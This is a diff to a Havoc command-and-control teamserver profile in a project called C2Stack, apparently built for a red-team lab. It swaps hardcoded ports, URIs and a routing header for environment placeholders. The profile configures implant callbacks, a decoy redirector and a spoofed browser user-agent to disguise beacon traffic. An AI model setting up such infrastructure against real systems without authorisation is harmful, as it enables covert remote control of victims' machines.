@@ -1,14 +1,18 @@
-# Havoc teamserver profile for C2Stack.
-# - Teamserver control port: 40056 (operators connect via the Qt client on Kali)
-# - HTTP C2 listener on :80 bound for the redirector route /edge/cache/assets
-#   with the C2_HEADER_NAME/VALUE agreed in C2Stack (X-Request-ID: cadre-c2).
-#   Hosts is the victim-facing callback host the payload is built with - it
-#   must be the redirector's host (set VICTIM_REDIRECTOR_IP for your lab)
-#   resolving to it. PortConn/PortBind/Uris/Headers must match Docker/.env
-#   (HAVOC_URI_PREFIX + C2_HEADER_*) or the callback is dropped.
+# Havoc teamserver profile for C2Stack - TEMPLATE, rendered by entrypoint.sh.
+#
+# Every network value below is a placeholder token (double underscore, upper
+# snake case) substituted from the environment at container start:
+# VICTIM_REDIRECTOR_IP, REDIRECTOR_HTTP_PORT, HAVOC_TS_PORT,
+# HAVOC_URI_PREFIX, C2_HEADER_NAME, C2_HEADER_VALUE.
+# Never commit a real address, port, path or header here - the teamserver
+# bakes these into every Demon at BUILD time, so a stale value fails
+# SILENTLY: beacons dial a dead address and nothing reports an error.
+# entrypoint.sh refuses to start if any placeholder survives rendering.
+# (This paragraph avoids writing the token syntax literally on purpose - the
+# entrypoint's leftover-token guard would match it and refuse to boot.)
 Teamserver {
     Host = "0.0.0.0"
-    Port = 40056
+    Port = __HAVOC_TS_PORT__
 
     Build {
         Compiler64 = "data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
@@ -35,21 +39,21 @@ Listeners {
         ]
         HostBind     = "0.0.0.0"
         HostRotation = "round-robin"
-        PortBind     = 80
-        PortConn     = 80
+        PortBind     = __REDIRECTOR_HTTP_PORT__
+        PortConn     = __REDIRECTOR_HTTP_PORT__
         Secure       = false # TLS terminates at the redirector; keep off in the DMZ
         KillDate     = "2030-01-01 00:00:00"
         UserAgent    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
 
         Uris = [
-            "/edge/cache/assets/"
+            "__HAVOC_URI_PREFIX__/"
         ]
 
         # Routing contract with the C2Stack redirector (Docker/.env):
         # C2_HEADER_NAME: C2_HEADER_VALUE - without it the redirector 404s the
         # path (decoy behavior), so the agent must send it on every request.
         Headers = [
-            "X-Request-ID: cadre-c2"
+            "__C2_HEADER_NAME__: __C2_HEADER_VALUE__"
         ]
 
         Response {
